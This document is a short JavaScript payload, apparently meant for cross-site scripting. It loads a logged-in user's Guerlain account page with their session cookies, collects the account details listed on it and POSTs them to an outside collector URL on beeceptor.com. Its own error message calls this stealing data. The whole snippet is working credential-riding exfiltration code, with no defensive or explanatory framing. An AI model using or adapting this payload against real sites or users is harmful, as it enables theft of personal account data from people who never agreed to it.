(async () => {
    try {
      const res = await fetch("https://www.guerlain.com/int/en-int/account", {
        credentials: "include"  // important to include cookies/session
      });
      const html = await res.text();
  
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, "text/html");
  
      const entries = {};
      doc.querySelectorAll("dl").forEach(dl => {
        const key = dl.querySelector("dt")?.innerText.trim();
        const val = dl.querySelector("dd")?.innerText.trim();
        if (key && val) entries[key] = val;
      });
  
      fetch("https://ambush.free.beeceptor.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(entries)
      });
    } catch (e) {
      console.error("Failed to steal data:", e);
    }
  })();
  